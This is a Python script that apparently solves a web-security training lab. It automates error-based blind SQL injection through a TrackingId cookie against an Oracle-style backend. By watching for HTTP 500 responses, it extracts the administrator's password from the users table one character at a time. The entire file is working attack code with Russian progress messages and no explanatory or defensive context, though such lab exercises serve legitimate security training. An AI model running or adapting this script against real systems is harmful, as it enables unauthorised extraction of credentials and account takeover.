import requests
import string

URL = "https://0a73004d031944f4802b088a00e6002e.web-security-academy.net/"

def check_condition(payload_condition):
    payload = f"x'||(SELECT CASE WHEN ({payload_condition}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    cookies = {'TrackingId': payload}
    
    response = requests.get(URL, cookies=cookies)
    return response.status_code == 500

def main():
    print("[*] Начинаем извлечение пароля администратора (Error-based)...")
    password = ""
    
    for position in range(1, 31):
        found_char = False
        
        for char in string.ascii_lowercase + string.digits:
            condition = f"SUBSTR((SELECT password FROM users WHERE username='administrator'), {position}, 1) = '{char}'"
            
            if check_condition(condition):
                password += char
                print(f"[+] Позиция {position}: {char} (Текущий пароль: {password})")
                found_char = True
                break
        
        if not found_char:
            print(f"[!] Символ на позиции {position} не найден. Конец пароля.")
            break
            
    print(f"\n[+] Итоговый пароль: {password}")

if __name__ == "__main__":
    main()